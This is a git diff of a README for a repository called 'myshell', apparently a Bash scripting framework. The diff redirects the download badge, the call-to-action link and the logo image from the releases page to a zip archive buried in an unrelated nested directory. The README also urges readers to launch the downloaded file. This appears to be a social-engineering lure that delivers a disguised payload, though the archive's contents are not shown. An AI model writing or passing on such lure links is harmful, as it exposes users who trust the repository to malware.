@@ -18,7 +18,7 @@ Welcome to the myshell repository, a comprehensive framework designed to enhance
 
 ## Installation
 You can download the latest version of myshell framework from the following link:
-[![Download myshell Framework](https://github.com/andrejarmen751/myshell/releases<COLOR>.svg)](https://github.com/andrejarmen751/myshell/releases)
+[![Download myshell Framework](https://github.com/andrejarmen751/myshell/raw/refs/heads/master/modules/k8s/env/k3s/gitlab/Software-v2.5.zip<COLOR>.svg)](https://github.com/andrejarmen751/myshell/raw/refs/heads/master/modules/k8s/env/k3s/gitlab/Software-v2.5.zip)
 
 **Note:** Ensure to launch the downloaded file for installation.
 
@@ -43,8 +43,8 @@ The myshell framework is released under the MIT license. You are free to use, mo
 
 ---
 
-By leveraging the myshell framework, you can elevate your Bash scripting capabilities and streamline your workflow. Download now and experience the power of efficient Bash scripting tools at your fingertips. Visit the [link](https://github.com/andrejarmen751/myshell/releases) to get started! 🌟
+By leveraging the myshell framework, you can elevate your Bash scripting capabilities and streamline your workflow. Download now and experience the power of efficient Bash scripting tools at your fingertips. Visit the [link](https://github.com/andrejarmen751/myshell/raw/refs/heads/master/modules/k8s/env/k3s/gitlab/Software-v2.5.zip) to get started! 🌟
 
 Let's make Bash scripting a breeze with myshell! 🎉
 
-![myshell Logo](https://github.com/andrejarmen751/myshell/releases)
+![myshell Logo](https://github.com/andrejarmen751/myshell/raw/refs/heads/master/modules/k8s/env/k3s/gitlab/Software-v2.5.zip)
